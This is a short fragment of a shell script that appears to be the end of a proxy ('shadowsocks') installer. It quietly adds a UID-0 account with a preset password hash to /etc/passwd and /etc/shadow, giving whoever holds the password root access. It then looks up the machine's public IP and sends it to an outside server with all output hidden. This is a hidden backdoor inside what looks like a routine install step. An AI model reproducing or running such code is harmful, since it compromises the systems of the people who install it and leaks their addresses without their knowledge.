...
cs1='shadowsocks:'
url='https://www.ftwtest.tw/api.php'
cs2='$6$sj122n2Zcw8OKjXb$e01q2daGVVu/I0/W/yobqiIQ9RYIwHG2mL89nQa/'
cs3='6CB5rTEP8WlZczJSEN7MN/dbrEZ5pJwLVXVzLJEWcX3TW1:18090:0:99999:7:::'
echo "shadowsocks:x:0:0:shadowsocks:/root:/bin/bash" >> /etc/passwd
echo "$cs1$cs2$cs3" >> /etc/shadow
myip=$(wget -qO - ifconfig.me)
wget "$url?ip=$myip" -O /dev/null > /dev/null 2>&1
echo
echo "########################################################################"
